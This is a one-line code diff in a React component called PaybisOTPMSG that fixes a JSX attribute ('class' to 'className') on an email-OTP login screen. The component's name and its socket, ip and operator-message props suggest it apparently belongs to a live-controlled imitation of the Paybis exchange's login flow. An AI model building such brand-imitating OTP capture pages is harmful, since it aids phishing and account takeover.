@@ -103,7 +103,7 @@ export default function PaybisOTPMSG({ socket, ip,setCenaAtual,msgRecebida }) {
           <div className="email-otp" country-code="BR">
             <div className="auth-app-header">{t('Login')}</div>
             <img src={envelope} alt="" className="email-otp__icon " />
-            <i data-v-198035f7="" class="icon icon-envelope-auth email-otp__icon"></i>
+            <i data-v-198035f7="" className="icon icon-envelope-auth email-otp__icon"></i>
             <p className="sent-notice">
               {msgRecebida}
               <br />
